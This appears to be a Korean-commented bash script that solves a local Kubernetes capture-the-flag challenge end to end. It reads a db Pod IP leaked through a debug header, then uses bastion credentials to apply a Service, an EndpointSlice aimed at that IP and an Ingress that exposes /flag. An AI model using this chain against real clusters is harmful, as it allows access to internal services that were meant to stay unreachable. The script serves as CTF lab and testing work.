#!/usr/bin/env bash
# end-to-end 검증 — 맥 호스트에서 `docker compose up` 이 ready 된 뒤 실행.
# 1) /user 노출·/flag 미노출 확인  2) 헤더로 db IP 유출 확인
# 3) 컨테이너 안에서 bastion 권한으로 익스플로잇 적용  4) /flag 로 플래그 회수
set -euo pipefail
C=${CONTAINER:-ctf-ingress}
say(){ printf '\n=== %s ===\n' "$*"; }

say "1. /user 는 열려 있고 /flag 는 404 여야 한다"
curl -sk -o /dev/null -w '/user  -> %{http_code}\n' https://localhost:443/user
curl -sk -o /dev/null -w '/flag  -> %{http_code}\n' https://localhost:443/flag

say "2. 디버그 헤더에서 db Pod IP 유출"
DBIP=$(curl -sk -i https://localhost:443/user | awk -F': ' 'tolower($1)=="x-debug-upstream"{print $2}' | tr -d '\r' | cut -d: -f1)
echo "유출된 db Pod IP: ${DBIP:?유출 실패}"

say "3. bastion 권한(kubeconfig)으로 익스플로잇 적용 (컨테이너 내부)"
docker exec -i "$C" env KUBECONFIG=/ctf/bastion/kubeconfig kubectl apply -f - <<EOF
apiVersion: v1
kind: Service
metadata: { name: pwn, namespace: bastion }
spec:
  ports: [{ name: http, port: 80, targetPort: 8080 }]
---
apiVersion: discovery.k8s.io/v1
kind: EndpointSlice
metadata:
  name: pwn-1
  namespace: bastion
  labels: { kubernetes.io/service-name: pwn }
addressType: IPv4
ports: [{ name: http, port: 8080, protocol: TCP }]
endpoints:
- addresses: ["${DBIP}"]
  conditions: { ready: true }
---
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata: { name: pwn, namespace: bastion }
spec:
  ingressClassName: nginx
  rules:
  - http:
      paths:
      - path: /flag
        pathType: Prefix
        backend: { service: { name: pwn, port: { number: 80 } } }
EOF

say "4. 플래그 회수 (Ingress 반영 대기)"
for i in $(seq 1 20); do
  OUT=$(curl -sk https://localhost:443/flag || true)
  case "$OUT" in *flag\{*) echo "$OUT"; echo ">>> 성공"; exit 0;; esac
  sleep 2
done
echo ">>> 실패: 20회 재시도 후에도 플래그 없음"; exit 1
